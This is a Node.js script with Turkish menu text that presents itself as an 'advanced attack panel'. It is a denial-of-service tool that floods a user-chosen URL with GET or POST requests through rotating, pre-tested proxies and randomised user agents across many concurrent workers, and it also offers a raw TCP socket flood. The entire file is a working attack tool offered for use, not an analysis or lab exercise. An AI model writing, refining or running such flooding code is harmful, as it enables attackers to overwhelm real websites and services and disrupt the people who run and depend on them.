// script.js
const fs = require('fs');
const fsPromises = require('fs').promises;
const axios = require('axios');
const colors = require('colors');
const { SocksProxyAgent } = require('socks-proxy-agent');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { createInterface } = require('readline');
const net = require('net');
const crypto = require('crypto');

const rl = createInterface({ input: process.stdin, output: process.stdout });

let proxies = [];

async function loadProxies() {
    try {
        const data = await fsPromises.readFile('proxies.txt', 'utf8');
        proxies = data.split('\n').map(p => p.trim()).filter(Boolean);
        console.log(`🔌 ${proxies.length} proxy bulundu. Doğrulanıyor...`.cyan);
        const working = [];
        for (let proxy of proxies) {
            const isWorking = await testProxy(proxy);
            if (isWorking) working.push(proxy);
        }
        proxies = working;
        console.log(`✅ ${proxies.length} proxy kullanılabilir durumda.`.green);
    } catch {
        console.log(`⚠️ proxies.txt bulunamadı`.red);
    }
}

async function testProxy(proxy) {
    try {
        const agent = proxy.includes('socks') ?
            new SocksProxyAgent(`socks5://${proxy}`) :
            new HttpsProxyAgent(`http://${proxy}`);
        await axios.get('https://api.ipify.org', {
            httpAgent: agent, httpsAgent: agent, timeout: 3000,
        });
        return true;
    } catch { return false; }
}

function ask(q) {
    return new Promise(resolve => rl.question(q, resolve));
}

const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/123.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1 Safari/605.1',
];

function getRandom(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function getHeaders() {
    return {
        'User-Agent': getRandom(userAgents),
        'Accept': '*/*',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache'
    };
}

async function flood(url, method, duration, threads) {
    const end = Date.now() + duration * 1000;
    let success = 0, fail = 0;

    const workers = Array.from({ length: threads }, () => (async () => {
        while (Date.now() < end) {
            const proxy = getRandom(proxies);
            const [host, port] = proxy.split(':');
            const agent = proxy.includes('socks') ?
                new SocksProxyAgent(`socks5://${proxy}`) :
                new HttpsProxyAgent(`http://${proxy}`);

            try {
                let res;
                if (method === 'POST') {
                    res = await axios.post(url, { data: crypto.randomBytes(5).toString('hex') }, {
                        headers: getHeaders(),
                        httpAgent: agent,
                        httpsAgent: agent,
                        timeout: 8000
                    });
                } else {
                    res = await axios.get(url, {
                        headers: getHeaders(),
                        httpAgent: agent,
                        httpsAgent: agent,
                        timeout: 8000
                    });
                }

                if (res.status < 400) {
                    success++;
                    process.stdout.write(`[✔️ ${res.status}] `.green);
                } else {
                    fail++;
                    process.stdout.write(`[✘ ${res.status}] `.red);
                }

            } catch (e) {
                fail++;
                process.stdout.write(`[ERR] `.red);
            }
        }
    })());

    await Promise.all(workers);
    console.log(`\nBitti ✅ Başarılı: ${success}, Hatalı: ${fail}`.yellow);
}

// RAW SOCKET FLOOD
async function rawSocketFlood(host, port, duration) {
    const end = Date.now() + duration * 1000;
    while (Date.now() < end) {
        const socket = new net.Socket();
        socket.connect(port, host, () => {
            socket.write(`GET /${crypto.randomBytes(8).toString('hex')} HTTP/1.1\r\nHost: ${host}\r\nConnection: Keep-Alive\r\n\r\n`);
        });
        socket.on('error', () => socket.destroy());
        socket.setTimeout(2000, () => socket.destroy());
    }
}

// ANA MENÜ
(async () => {
    console.clear();
    console.log(`\n🔥 ${'GELİŞMİŞ SALDIRI PANELİ'.rainbow.bold} 🔥`);
    console.log('1) GET Flood\n2) POST Flood\n3) RAW Socket Flood\n'.cyan);

    const methodSelect = await ask('Seçim (1-3): ');
    const url = await ask('Hedef URL (http://...): ');
    const duration = parseInt(await ask('Süre (sn): '));
    const threads = parseInt(await ask('Thread sayısı: '));

    await loadProxies();

    if (methodSelect === '3') {
        const host = new URL(url).hostname;
        const port = url.startsWith('https') ? 443 : 80;
        console.log(`RAW SOCKET saldırısı başlatıldı ${host}:${port}`.magenta);
        await rawSocketFlood(host, port, duration);
    } else {
        const method = methodSelect === '2' ? 'POST' : 'GET';
        console.log(`\n🚀 Saldırı başlatıldı: ${method} | ${url}`.bold);
        await flood(url, method, duration, threads);
    }

    process.exit();
})();
